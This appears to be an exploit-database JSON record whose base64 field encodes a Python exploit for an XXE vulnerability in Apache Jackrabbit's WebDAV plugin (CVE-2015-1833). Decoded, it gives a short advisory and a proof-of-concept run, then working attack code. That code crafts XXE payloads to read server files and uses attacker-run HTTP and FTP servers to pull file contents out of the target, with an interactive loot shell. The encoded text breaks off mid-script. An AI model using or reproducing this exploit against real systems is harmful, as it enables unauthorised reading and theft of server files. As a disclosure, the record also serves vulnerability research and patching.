{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoiIiINCiMgRXhwbG9pdCBUaXRsZTogSmFja3JhYmJpdCBXZWJEQVYgWFhFDQojIERhdGU6IDI1LTA1LTIwMTUNCiMgU29mdHdhcmUgTGluazogaHR0cDovL2phY2tyYWJiaXQuYXBhY2hlLm9yZy9qY3IvDQojIEV4cGxvaXQgQXV0aG9yOiBNaWtoYWlsIEVnb3Jvdg0KIyBDb250YWN0OiAwYW5nM2VsICgpIGdtYWlsIGNvbQ0KIyBXZWJzaXRlOiBodHRwOi8vMGFuZzNlbC5ibG9nc3BvdC5jb20NCiMgQ1ZFOiBDVkUtMjAxNS0xODMzDQojIENhdGVnb3J5OiB3ZWJhcHBzDQoNCjEuIERlc2NyaXB0aW9uDQoNCkphY2tyYWJiaXQgV2ViREFWIHBsdWdpbiB1c2UgaW5zZWN1cmVseSBjb25maWd1cmVkIFhNTCBwYXJzZXIgdG8gcGFyc2UNCmluY29taW5nIFBST1BQQVRDSCBhbmQgUFJPUEZJTkQgcmVxdWVzdHMuIEFzIGEgcmVzdWx0IGl0IGlzIHZ1bG5lcmFibGUgdG8NClhYRSBhdHRhY2tzLg0KQmVzaWRlcyBKYWNrcmFiYml0IEpDUiwgV2ViREFWIHBsdWdpbiBpcyBpbmNvcnBvcmF0ZWQgaW50byB0aGUgZm9sbG93aW5nDQpzb2Z0d2FyZTogQXBhY2hlIFNsaW5nLCBBZG9iZSBBRU0uDQoNCjIuIFByb29mIG9mIENvbmNlcHQNCg0KRG93bmxvYWQgdnVsbmVyYWJsZSBBcGFjaGUgU2xpbmcgbGF1bmNocGFkIHdlYiBhcHBsaWNhdGlvbiBmcm9tIGhlcmUgLQ0KaHR0cHM6Ly9zbGluZy5hcGFjaGUub3JnDQoNClN0YXJ0IGxhdW5jaHBhZCB3ZWIgYXBwbGljYXRpb24gYXMgZm9sbG93czoNCnJvb3RAa2FsaTp+L2J1aWxkLXNsaW5nIyBqYXZhIC1qYXINCm9yZy5hcGFjaGUuc2xpbmcubGF1bmNocGFkLTgtU05BUFNIT1Qtc3RhbmRhbG9uZS5qYXINCg0KTGF1bmNoIGV4cGxvaXQgd2l0aCB0aGUgZm9sbG93aW5nIGNvbW1hbmQ6DQpyb290QGthbGk6fiMgcHl0aG9uIGN2ZS0yMDE1LTE4MzMucHkgLS11cmwgaHR0cDovLzEyNy4wLjAuMTo4MDgwL2NvbnRlbnQveHhlDQotLXRlY2ggb29iIC0taXAgMTI3LjAuMC4xDQplbnRlciBjb21tYW5kPiBnZXQgLg0KDQpsb2FkZWQgMjEwIGJ5dGVzIGluIGJ1ZmZlcg0KDQplbnRlciBjb21tYW5kPiBzaG93DQoNCmFwYWNoZS1tYXZlbi0zLjAuNQ0KYXBhY2hlLW1hdmVuLTMuMC41LWJpbi50YXIuZ3oNCmRlcmJ5LmxvZw0KZWNsaXBzZQ0KaHNfZXJyX3BpZDUzNzkubG9nDQpvcmcuYXBhY2hlLnNsaW5nLmxhdW5jaHBhZC04LVNOQVBTSE9ULXN0YW5kYWxvbmUuamFyDQpweXRob24td29ya3NwYWNlDQoNCmVudGVyIGNvbW1hbmQ+IHN0b3JlIC90bXAvY3dkLmxzdA0KDQpidWZmZXIgY29udGVudCBoYXMgYmVlbiBzdG9yZWQgaW4gZmlsZSAvdG1wL2N3ZC5sc3QNCg0KZW50ZXIgY29tbWFuZD4gZXhpdA0Kcm9vdEBrYWxpOn4jDQoNCkV4cGxvaXQgaGF2ZSB0aHJlZSBleHBsb2l0YXRpb24gdGVjaG5pcXVlczoNCiogaW5iMSAtIGluYm91bmQgWFhFIHRlY2huaXF1ZSwgaXQgZmlyc3Qgd3JpdGVzIGNvbnRlbnQgYXMgYXR0cmlidXRlIHZhbHVlDQpvZiBjb250cm9sbGFibGUgSkNSIG5vZGUgdXNpbmcgUFJPUFBBVENIIHJlcXVlc3QgYW5kIHRoZW4gcmV0cmlldmVzIGNvbnRlbnQNCnVzaW5nIFBST1BGSU5EIHJlcXVlc3QNCiogaW5iMiAtIHNhbWUgYXMgaW5iMSwgYnV0IHRoZXJlIGlzIHNvbWUgWE1MIG1hZ2ljIHRvIHJldHJpZXZlIGNvbnRlbnQgdGhhdA0KaXMgbm90IHZhbGlkIFhNTCBkYXRhDQoqIG9vYiAtIG91dC1vZi1ib3VuZCB0ZWNobmlxdWUsIHV0aWxpemVzIEZUUCBoYWNrIGZyb20gdGhpcyBibG9nDQpodHRwOi8vbGFiLm9uc2VjLnJ1LzIwMTQvMDYveHhlLW9vYi1leHBsb2l0YXRpb24tYXQtamF2YS0xNy5odG1sDQpUZWNobmlxdWUgaW5iMiBpcyB0aGUgbW9zdCBzdGFibGUuIEJ1dCBpdCByZXF1aXJlcyBjcmVkZW50aWFscyBvZiB0aGUgdXNlcg0KdGhhdCBpcyBhYmxlIHRvIG1vZGlmeSBzb21lIEpDUiBub2RlLiBBdHRhY2tlciBob3N0IG11c3QgaGF2ZSAidmlzaWJsZSBpcCINCndoaWNoIGlzIHJlcXVpcmVkIGZvciBjb21tdW5pY2F0aW9uIGJldHdlZW4gdGFyZ2V0IGFuZCBhdHRhY2tlcidzIGhvc3QuDQpUZWNobmlxdWUgb29iIHdvcmtzIGV2ZW4gd2l0aCBhbm9ueW1vdXMgY3JlZGVudGlhbHMuIEJ1dCBpdCBpcyBub3Qgc28NCnN0YWJsZSBhcyBpbmIyIHRlY2huaXF1ZS4NClRlY2huaXF1ZSBpbmIxIGRvZXMgbm90IHJlcXVpcmUgInZpc2libGUgaXAiLCBidXQgdGhlcmUgYXJlIGxpbWl0YXRpb25zIG9uDQpyZXRyaWV2ZWQgY29udGVudC4NCg0KMy4gU29sdXRpb246DQoNCklmIHlvdSB1c2UgQXBhY2hlIEphY2tyYWJiaXQsIGluc3RhbGwgdmVyc2lvbiAyLjEwLjEuDQpodHRwOi8vd3d3LmFwYWNoZS5vcmcvZGlzdC9qYWNrcmFiYml0LzIuMTAuMS9SRUxFQVNFLU5PVEVTLnR4dA0KIiIiDQpmcm9tIHVybGxpYjIgaW1wb3J0ICoNCmltcG9ydCBzeXMsIHN0cmluZywgcmFuZG9tDQppbXBvcnQgYmFzZTY0DQppbXBvcnQgeG1sLmV0cmVlLkVsZW1lbnRUcmVlIGFzIEVUDQppbXBvcnQgQmFzZUhUVFBTZXJ2ZXIsIFNpbXBsZUhUVFBTZXJ2ZXINCmZyb20gbXVsdGlwcm9jZXNzaW5nIGltcG9ydCBQcm9jZXNzLCBWYWx1ZSwgTWFuYWdlcg0KZnJvbSBvcHRwYXJzZSBpbXBvcnQgT3B0aW9uUGFyc2VyDQppbXBvcnQgc29ja2V0LCBzZWxlY3QNCg0KdXNhZ2U9ICIiIg0KICAgICVwcm9nIC0tdXJsIDx1cmw+IC0tdGVjaCBpbmIxIFsgLS1jcmVkcyA8Y3JlZHM+IF0NCiAgICANCiAgICAlcHJvZyAtLXVybCA8dXJsPiAtLXRlY2ggaW5iMiAtLWlwIDxpcD4gWyAtLWNyZWRzIDxjcmVkcz4gLS1ocG9ydCA8aHBvcnQ+IF0NCiAgICANCiAgICAlcHJvZyAtLXVybCA8dXJsPiAtLXRlY2ggb29iIC0taXAgPGlwPiBbIC0tY3JlZHMgPGNyZWRzPiAtLWhwb3J0IDxocG9ydD4gLS1mcG9ydCA8ZnBvcnQ+XQ0KIiIiDQoNCmhlbHBfaW50ZXJwcmV0ZXIgPSAiIiINCiAgICBoZWxwIC0gcHJpbnQgdGhpcyBoZWxwLg0KICAgIA0KICAgIGdldCA8ZGlyIG9yIGZpbGU+IC0gcmV0cmlldmUgZGlyZWN0b3J5IGxpc3Rpbmcgb3IgZmlsZSBjb250ZW50IGFuZCBzdG9yZSBpdCBpbnNpZGUgaW50ZXJuYWwgYnVmZmVyLiBZb3UgY2FuIHVzZSAiLiIgdG8gZGVub3RlIGN1cnJlbnQgZGlyZWN0b3J5IChlLmcuIHVzZSAiZ2V0IC4iIGZvciBjd2QgbGlzdGluZykuDQogICAgDQogICAgc2hvdyAtIHNob3cgY29udGVudCBvZiBpbnRlcm5hbCBidWZmZXIuDQogICAgDQogICAgc3RvcmUgPG91dCBmaWxlPiAtIHN0b3JlIGludGVybmFsIGJ1ZmZlciBpbiBmaWxlLg0KICAgIA0KICAgIGV4aXQgLSBzdG9wIGV4cGxvaXRpbmcNCiAgICAiIiINCiAgICANCmZhaWx1cmVfZGVzY3IgPSAiIiINClBvc3NpYmxlIHJlYXNvbnM6DQogICAgMS4gSW5hcHByb3ByaWF0ZSB0ZWNobmlxdWUsIHRyeSBhbm90aGVyIG9wdGlvbnMuDQogICAgMi4gWW91IGRvIG5vdCBoYXZlIHBlcm1pc3Npb25zIHRvIHJlYWQgZmlsZSBvciBsaXN0IGRpcmVjdG9yeS4NCiAgICAzLiBUYXJnZXQgaXMgbm90IGV4cGxvaXRhYmxlLg0KIiIiDQogICAgDQpyYW5kX2F0dHIgPSAnJw0Kc2NyaXB0X25hbWUgPSBzeXMuYXJndlswXS5zcGxpdCgnLycpWy0xXQ0KDQpidWZmZXJfd2l0aF9sb290ID0gJycNCg0KdXJsLCB0ZWNoLCBpcCwgY3JlZHMsIGhwb3J0LCBmcG9ydCA9IFtOb25lXSAqIDYNCg0KaHR0cF9zZXJ2ZXIsIGZ0cF9zZXJ2ZXIgPSBbTm9uZV0gKiAyDQoNCmNsYXNzIEhUVFBfWFhFKCk6DQogICAgZGVmIF9faW5pdF9fKHNlbGYsIGlwLCBwb3J0LCBmcG9ydCk6DQogICAgICAgIHNlbGYucG9ydCA9IHBvcnQNCiAgICAgICAgc2VsZi5pcCA9IGlwDQogICAgICAgIHNlbGYuZnBvcnQgPSBmcG9ydA0KICAgICAgICANCiAgICBkZWYgcnVuKHNlbGYpOg0KICAgICAgICBjbGFzcyBodHRwX2hhbmRsZXIoQmFzZUhUVFBTZXJ2ZXIuQmFzZUhUVFBSZXF1ZXN0SGFuZGxlcik6DQogICAgICAgICAgICBkZWYgX19pbml0X18oc2VsZiwgaXAsIGZwb3J0LCphcmdzKToNCiAgICAgICAgICAgICAgICBzZWxmLmlwID0gaXANCiAgICAgICAgICAgICAgICBzZWxmLmZwb3J0ID0gZnBvcnQNCiAgICAgICAgICAgICAgICBCYXNlSFRUUFNlcnZlci5CYXNlSFRUUFJlcXVlc3RIYW5kbGVyLl9faW5pdF9fKHNlbGYsICphcmdzKQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgZGVmIGRvX0dFVChzZWxmKToNCiAgICAgICAgICAgICAgICBpZiAiaW5iMiIgaW4gc2VsZi5wYXRoOg0KICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQ0KICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCdhcHBsaWNhdGlvbi94bWwnKQ0KICAgICAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkNCiAgICAgICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZSgnPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48IUVOVElUWSBhbGwgIiVzdGFydDslbG9vdDslZW5kOyI+JykNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgIm9vYiIgaW4gc2VsZi5wYXRoOg0KICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQ0KICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCdhcHBsaWNhdGlvbi94bWwnKQ0KICAgICAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkNCiAgICAgICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZSgnPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48IUVOVElUWSAlJSBhbGwgIjwhRU5USVRZICYjMzc7IHNlbmQgU1lTVEVNICJmdHA6Ly8lKGlwKXM6JShwb3J0KXMvJSVsb290OyI+Ij4lJWFsbDsnICUgeydpcCcgOiBzZWxmLmlwLCAncG9ydCcgOiBzZWxmLmZwb3J0fSkNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICBkZWYgbG9nX21lc3NhZ2Uoc2VsZiwgZm9ybWF0LCAqYXJncyk6ICMgc2lsZW50IEhUVFAgc2VydmVyDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgIGRlZiBzZXJ2ZShodHRwZCk6DQogICAgICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgICAgIGh0dHBkLmhhbmRsZV9yZXF1ZXN0KCkNCiAgICAgICAgDQogICAgICAgIGhhbmRsZXIgPSBsYW1iZGEgKmFyZ3M6IGh0dHBfaGFuZGxlcihzZWxmLmlwLCBzZWxmLmZwb3J0LCAqYXJncykgICAgDQogICAgICAgIGh0dHBkID0gQmFzZUhUVFBTZXJ2ZXIuSFRUUFNlcnZlcigoJzAuMC4wLjAnLCBzZWxmLnBvcnQpLCBoYW5kbGVyKQ0KICAgICAgICBzZWxmLnByb2MgPSBQcm9jZXNzKHRhcmdldCA9IHNlcnZlLCBhcmdzID0gKGh0dHBkLCkpDQogICAgICAgIHNlbGYucHJvYy5zdGFydCgpDQogICAgICAgICAgICANCiAgICBkZWYgc3RvcChzZWxmKToNCiAgICAgICAgc2VsZi5wcm9jLnRlcm1pbmF0ZSgpDQogICAgDQpjbGFzcyBGVFBfWFhFKCk6DQogICAgZGVmIF9faW5pdF9fKHNlbGYsIHBvcnQpOg0KICAgICAgICBzZWxmLnBvcnQgPSBwb3J0DQogICAgICAgIA0KICAgIGRlZiBydW4oc2VsZik6DQogICAgICAgIGNsYXNzIGZ0cF9oYW5kbGVyKCk6DQogICAgICAgICAgICBkZWYgX19pbml0X18oc2VsZiwgcG9ydCk6DQogICAgICAgICAgICAgICAgc2VsZi5zZXJ2ZXIgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgICAgICAgICAgICAgc2VsZi5zZXJ2ZXIuc2V0c29ja29wdChzb2NrZXQuU09MX1NPQ0tFVCwgc29ja2V0LlNPX1JFVVNFQUREUiwgMSkNCiAgICAgICAgICAgICAgICBzZWxmLnNlcnZlci5zZXRibG9ja2luZygwKQ0KICAgICAgICAgICAgICAgIHNlbGYuc2VydmVyLmJpbmQoKCcwLjAuMC4wJywgcG9ydCkpDQogICAgICAgICAgICAgICAgc2VsZi5zZXJ2ZXIubGlzdGVuKDUpDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICBkZWYgc2VydmUoc2VsZiwgZCk6DQogICAgICAgICAgICAgICAgaW5wdXRzID0gW3NlbGYuc2VydmVyXQ0KICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICAgICAgICAgIHJlYWRhYmxlLCB3cml0YWJsZSwgZXhjZXB0aW9uYWwgPSBzZWxlY3Quc2VsZWN0KGlucHV0cywgW10sIFtdKQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgZm9yIHMgaW4gcmVhZGFibGU6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBzIGlzIHNlbGYuc2VydmVyOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm5lY3Rpb24sIGNsaWVudF9hZGRyZXNzID0gcy5hY2NlcHQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm5lY3Rpb24uc2V0YmxvY2tpbmcoMCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnB1dHMuYXBwZW5kKGNvbm5lY3Rpb24pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubmVjdGlvbi5zZW5kKCIyMjAgeHhlLWZ0cC1zZXJ2ZXJcbiIpDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSBzLnJlY3YoMTAyNCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgZGF0YToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5wdXRzLnJlbW92ZShzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICJVU0VSIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzLnNlbmQoIjMzMSBwYXNzd29yZCBwbGVhc2UgLSB2ZXJzaW9uIGNoZWNrXG4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMuc2VuZCgiMjMwIG1vcmUgZGF0YSBwbGVhc2UhXG4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgbGVuKFt4IGZvciB4IGluIFsiUEFTUyIsIkVQU1YiLCJFUFJUIiwiVFlQRSJdIGlmIHggaW4gZGF0YV0pOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZFsnbG9vdCddICs9IGRhdGENCiAgICAgICAgDQogICAgICAgIHNlbGYuZCA9IE1hbmFnZXIoKS5kaWN0KCkNCiAgICAgICAgc2VsZi5kWydsb290J10gPSAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICBmdHBkID0gZnRwX2hhbmRsZXIoc2VsZi5wb3J0KQ0KICAgICAgICBzZWxmLnByb2MgPSBQcm9jZXNzKHRhcmdldCA9IGZ0cGQuc2VydmUsIGFyZ3M9KHNlbGYuZCwpKQ0KICAgICAgICBzZWxmLnByb2Muc3RhcnQoKQ0KICAgIA0KICAgIGRlZiBzdG9wKHNlbGYpOg0KICAgICAgICBzZWxmLnByb2MudGVybWluYXRlKCkNCiAgICAgICAgDQogICAgZGVmIGNsZWFuX2J1ZihzZWxmKToNCiAgICAgICAgc2VsZi5kWydsb290J10gPSAnJw0KICAgICAgICANCiAgICBkZWYgZ2V0X2xvb3Qoc2VsZik6DQogICAgICAgIGxvb3QgPSBzZWxmLmRbJ2xvb3QnXQ0KICAgICAgICANCiAgICAgICAgIyBjbGVhbiBkYXRhDQogICAgICAgIGxvb3QgPSBsb290LnJlcGxhY2UoJ1xyXG5SRVRSICcsJy8nKQ0KICAgICAgICBsb290ID0gbG9vdC5yZXBsYWNlKCdcclxuQ1dEICcsJy8nKQ0KICAgICAgICBsb290ID0gbG9vdC5yZXBsYWNlKCdDV0QgJywnJywxKQ0KICAgICAgICBsb290ID0gbG9vdC5yZXBsYWNlKCdSRVRSICcsJycsMSkNCiAgICAgICAgDQogICAgICAgIHJldHVybiBsb290DQogICAgICAgICAgICANCmRlZiBleHBsb2l0KHVybCwgdGVjaG5pcXVlLCBjcmVkcyA9ICdhbm9ueW1vdXM6YW5vbnltb3VzJyk6DQogICAgDQogICAgZ2xvYmFsIGJ1ZmZlcl93aXRoX2xvb3QsIHJhbmRfYXR0cg0KICAgIA0KICAgIHJlcXVlc3RzID0gew0KICAgICAgICAnaW5iMScgOiB7DQogICAgICAgICAgICAnUFJPUFBBVENIJyA6ICc8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/PjwhRE9DVFlQRSBwcm9wZXJ0eXVwZGF0ZSBbIDwhRU5USVRZIGxvb3QgU1lTVEVNICIlKGZpbGUpcyI+IF0+IDxEOnByb3BlcnR5dXBkYXRlICB4bWxuczpEPSJEQVY6Ij4gPEQ6c2V0PiA8RDpwcm9wPiAgPCUoYXR0cl9uYW1lKXM+Jmxvb3Q7PC8lKGF0dHJfbmFtZSlzPiA8L0Q6cHJvcD4gPC9EOnNldD4gPC9EOnByb3BlcnR5dXBkYXRlPicsDQogICAgICAgICAgICAnUFJPUEZJTkQnOiAnPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4gPEQ6cHJvcGZpbmQgeG1sbnM6RD0iREFWOiI+IDxhbGxwcm9wLz4gPC9EOnByb3BmaW5kPicNCiAgICAgICAgfSwNCiAgICAgICAgICAgICAgICANCiAgICAgICAgJ2luYjInIDogew0KICAgICAgICAgICAgJ1BST1BQQVRDSCcgOiAnPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48IURPQ1RZUEUgcHJvcGVydHl1cGRhdGUgWyA8IUVOVElUWSAlJSBzdGFydCAiPCFbQ0RBVEFbIj4gPCFFTlRJVFkgJSUgbG9vdCBTWVNURU0gIiUoZmlsZSlzIj4gPCFFTlRJVFkgJSUgZW5kICJdXT4iPiA8IUVOVElUWSAlJSBkdGQgU1lTVEVNICJodHRwOi8vJShpcClzOiUocG9ydClzL2luYjIiPiAlJWR0ZDsgXT4gPEQ6cHJvcGVydHl1cGRhdGUgIHhtbG5zOkQ9IkRBVjoiPiA8RDpzZXQ+IDxEOnByb3A+ICA8JShhdHRyX25hbWUpcz4mYWxsOzwvJShhdHRyX25hbWUpcz4gPC9EOnByb3A+IDwvRDpzZXQ+IDwvRDpwcm9wZXJ0eXVwZGF0ZT4nLA0KICAgICAgICAgICAgJ1BST1BGSU5EJzogJzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+IDxEOnByb3BmaW5kIHhtbG5zOkQ9IkRBVjoiPiA8YWxscHJvcC8+IDwvRDpwcm9wZmluZD4nDQogICAgICAgIH0sDQogICAgICAgICAgICAgICAgDQogICAgICAgICdvb2InIDogew0KICAgICAgICAgICAgJ1BST1BGSU5EJzogJzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+IDwhRE9DVFlQRSBwcm9wZmluZCBbIDwhRU5USVRZICUlIGxvb3QgU1lTVEVNICIlKGZpbGUpcyI+IDwhRU5USVRZICUlIGR0ZCBTWVNURU0gImh0dHA6Ly8lKGlwKXM6JShwb3J0KXMvb29iIj4gJSVkdGQ7ICUlc2VuZDsgIF0+IDxEOnByb3BmaW5kIHhtbG5zOkQ9IkRBVjoiPiA8YWxscHJvcC8+IDwvRDpwcm9wZmluZD4nDQogICAgICAgIH0NCiAgICB9DQogICAgIA0KICAgIGRlZiByZXF1ZXN0KHVybCwgdmVyYiwgZGF0YSwgY3JlZHMsIHRpbWVvdXQpOg0KICAgICAgICByZXEgPSBSZXF1ZXN0KHVybCwgZGF0YSkNCiAgICAgICAgcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLCBzY3JpcHRfbmFtZSkNCiAgICAgICAgcmVxLmFkZF9oZWFkZXIoJ0NvbnRlbnQtVHlwZScsICdhcHBsaWNhdGlvbi94bWwnKQ0KICAgICAgICByZXEuYWRkX2hlYWRlcignQXV0aG9yaXphdGlvbicsICdCYXNpYyAnICsgYmFzZTY0LmI2NGVuY29kZShjcmVkcykpDQogICAgICAgIHJlcS5nZXRfbWV0aG9kID0gbGFtYmRhOiB2ZXJiDQogICAgICAgIA0KICAgICAgICAjcmVxLnNldF9wcm94eSgnMTI3LjAuMC4xOjgwODEnLCdodHRwJykgICMjIyBGb3IgZGVidWcNCiAgICAgICAgDQogICAgICAgIHJlc3AgPSBOb25lDQogICAgICAgIHRyeTogICAgICANCiAgICAgICAgICAgIHJlc3AgPSAgdXJsb3BlbihyZXEsIHRpbWVvdXQgPSB0aW1lb3V0KS5yZWFkKCkNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiwgZToNCiAgICAgICAgICAgIHBhc3MNCiAgICAgICAgDQogICAgICAgIHJldHVybiByZXNwDQogICAgICAgIA0KICAgIHdoaWxlIDE6DQogICAgICAgIGNtZGxpbmUgPSByYXdfaW5wdXQoJ1wwMzNbMzNtZW50ZXIgY29tbWFuZD4gXDAzM1swbScpDQogICAgICAgIGNtZGxpbmUgPSByZS5zdWIoJ1xzKycsICcgJywgY21kbGluZSkNCiAgICAgICAgY21kID0gY21kbGluZS5zcGxpdCgnICcpWzBdDQogICAgICAgIGFyZyA9IGNtZGxpbmUuc3BsaXQoJyAnKVstMV0NCiAgICAgICAgDQogICAgICAgIGlmIGNtZCBub3QgaW4gWydoZWxwJywgJ2dldCcsICdzaG93JywgJ3N0b3JlJywgJ2V4aXQnXToNCiAgICAgICAgICAgIHByaW50ICdcblwwMzNbMzZtbm8gc3VjaCBjb21tYW5kLCB1c2UgaGVscCBmb3IgY29tbWFuZCBsaXN0IFwwMzNbMG1cbicNCiAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIA0KICAgICAgICBpZiBjbWQgPT0gJ2V4aXQnOg0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgDQogICAgICAgIGlmIGNtZCA9PSAnaGVscCc6DQogICAgICAgICAgICBwcmludCAnXDAzM1szNm0nICsgaGVscF9pbnRlcnByZXRlciArICdcMDMzWzBtJw0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgDQogICAgICAgIGlmIGNtZCA9PSAnc2hvdyc6DQogICAgICAgICAgICBwcmludCAnXG5cMDMzWzM2bScgKyBidWZmZXJfd2l0aF9sb290ICsgJ1wwMzNbMG0nDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICANCiAgICAgICAgaWYgY21kID09ICdzdG9yZSc6DQogICAgICAgICAgICB3aXRoIG9wZW4oYXJnLCd3JykgYXMgb3V0ZjoNCiAgICAgICAgICAgICAgICBvdXRmLndyaXRlKGJ1ZmZlcl93aXRoX2xvb3QpDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICBwcmludCAnXG5cMDMzWzMybWJ1ZmZlciBjb250ZW50IGhhcyBiZWVuIHN0b3JlZCBpbiBmaWxlICcgKyBhcmcgKyAnXDAzM1swbVxuJw0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgDQogICAgICAgIGlmIGNtZCA9PSAnZ2V0JzoNCiAgICAgICAgICAgIGlmIGFyZy5zdGFydHN3aXRoKCcuJyk6DQogICAgICAgICAgICAgICAgYXJnID0gJy9wcm9jL3NlbGYvY3dkJyArIGFyZ1sxOl0NCiAgICAgICAgICAgIGFyZyA9ICdmaWxlOi8vJyArIGFyZw0KICAgICAgICAgICAgDQogICAgICAgICAgICByYW5kX2F0dHIgPSAnJy5qb2luKFtyYW5kb20uY2hvaWNlKHN0cmluZy5hc2NpaV9sb3dlcmNhc2UpIGZvciBpIGluIHJhbmdlKDEwKV0pICMjIyByYW5kb20gYXR0cmlidXRlIG5hbWUgd2hlcmUgd2UgcGxhY2UgY29udGVudA0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiB0ZWNobmlxdWUgPT0gJ2luYjEnOg0KICAgICAgICAgICAgICAgIHJlcXVlc3QxID0gcmVxdWVzdHNbJ2luYjEnXVsnUFJPUFBBVENIJ10gJSB7J2F0dHJfbmFtZScgOiByYW5kX2F0dHIsICdmaWxlJyA6IGFyZ30NCiAgICAgICAgICAgICAgICByZXF1ZXN0KHVybCwgJ1BST1BQQVRDSCcsIHJlcXVlc3QxLCBjcmVkcywgdGltZW91dCA9IDMwKQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHJlcXVlc3QyID0gcmVxdWVzdHNbJ2luYjEnXVsnUFJPUEZJTkQnXQ0KICAgICAgICAgICAgICAgIGxvb3QgPSByZXF1ZXN0KHVybCwgJ1BST1BGSU5EJywgcmVxdWVzdDIsIGNyZWRzLCB0aW1lb3V0ID0gMzApDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBidWZmZXJfd2l0aF9sb290ID0gRVQuZnJvbXN0cmluZyhsb290KS5maW5kYWxsKCcuLy8nICsgcmFuZF9hdHRyKVswXS50ZXh0DQogICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICBidWZmZXJfd2l0aF9sb290ID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIGlmIHRlY2huaXF1ZSA9PSAnaW5iMic6DQogICAgICAgICAgICAgICAgcmVxdWVzdDEgPSByZXF1ZXN0c1snaW5iMiddWydQUk9QUEFUQ0gnXSAlIHsnYXR0cl9uYW1lJyA6IHJhbmRfYXR0ciwgJ2ZpbGUnIDogYXJnLCAnaXAnIDogaXAsICdwb3J0JyA6IGhwb3J0fQ0KICAgICAgICAgICAgICAgIHJlcXVlc3QodXJsLCAnUFJPUFBBVENIJywgcmVxdWVzdDEsIGNyZWRzLCB0aW1lb3V0ID0gMzApDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcmVxdWVzdDIgPSByZXF1ZXN0c1snaW5iMiddWydQUk9QRklORCddDQogICAgICAgICAgICAgICAgbG9vdCA9IHJlcXVlc3QodXJsLCAnUFJPUEZJTkQnLCByZXF1ZXN0MiwgY3JlZHMsIHRpbWVvdXQgPSAzMCkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB0cnk6ICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgYnVmZmVyX3dpdGhfbG9vdCA9IEVULmZyb21zdHJpbmcobG9vdCkuZmluZGFsbCgnLi8vJyArIHJhbmRfYXR0